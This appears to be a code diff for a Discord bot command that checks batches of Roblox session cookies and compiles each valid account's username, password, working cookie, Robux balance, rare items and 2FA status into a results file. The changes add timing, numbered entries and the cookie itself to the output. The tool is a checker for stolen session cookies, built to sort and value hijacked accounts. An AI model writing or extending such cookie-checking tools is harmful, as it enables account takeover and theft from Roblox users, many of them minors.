@@ -46,6 +46,8 @@ const data = new SlashCommandBuilder()
   ) as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
+  const startTime = Date.now();
+
   try {
     await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
@@ -91,6 +93,8 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       }
     }
 
+    let dataIndex = 0;
+
     for (const rawCookie of cookies) {
       const validation = await Roblox.validateCookie(rawCookie);
       if (!validation.valid) {
@@ -99,6 +103,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       }
 
       validCount++;
+      dataIndex++;
       const userId = String(validation.userId!);
       const username = validation.username!;
 
@@ -146,17 +151,31 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         await interaction.channel?.send({ embeds: [embed] });
       }
 
-      outputLines.push(
-        `Username: ${username} | Password: ${password} | UserID: ${userId} | Robux: ${robux} | Pending: ${pendingRobux} | Country: ${country} | RAP: ${rap.rap ?? 'N/A'} | Premium: ${rap.premium ? 'Yes' : 'No'} | Email: ${email.verified || 'None'} | Phone: ${phone.hasPhone ? (phone.verified ? 'Verified' : 'Unverified') : 'No'} | 2FA: ${twoStep.email ? 'Email' : ''}${twoStep.authenticator ? ' Auth' : ''} | Rare: ${ownedRares.join(', ') || 'None'}`
-      );
+      outputLines.push(`Data ${dataIndex}`);
+      outputLines.push(`Username: ${username}`);
+      outputLines.push(`Password: ${password}`);
+      outputLines.push(`UserID: ${userId}`);
+      outputLines.push(`Cookie: ${workingCookie}`);
+      outputLines.push(`Robux: ${robux}`);
+      outputLines.push(`Pending: ${pendingRobux}`);
+      outputLines.push(`Country: ${country}`);
+      outputLines.push(`RAP: ${rap.rap ?? 'N/A'}`);
+      outputLines.push(`Premium: ${rap.premium ? 'Yes' : 'No'}`);
+      outputLines.push(`Email: ${email.verified || 'None'}`);
+      outputLines.push(`Phone: ${phone.hasPhone ? (phone.verified ? 'Verified' : 'Unverified') : 'No'}`);
+      outputLines.push(`2FA: ${[twoStep.email ? 'Email' : '', twoStep.authenticator ? 'Authenticator' : ''].filter(Boolean).join(', ') || 'None'}`);
+      outputLines.push(`Rare: ${ownedRares.join(', ') || 'None'}`);
+      outputLines.push('');
     }
 
     const totalCookies = cookies.length;
+    const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);
+
     const summaryText =
-      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}`;
+      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}\n⭑ **Time:** ${elapsedSeconds}s`;
 
     const summaryEmbed = buildSuccessEmbed(summaryText);
-    const fileContentOutput = outputLines.join('\n') || 'No valid cookies found.';
+    const fileContentOutput = outputLines.join('\n').trim() || 'No valid cookies found.';
     const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
     const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });
 
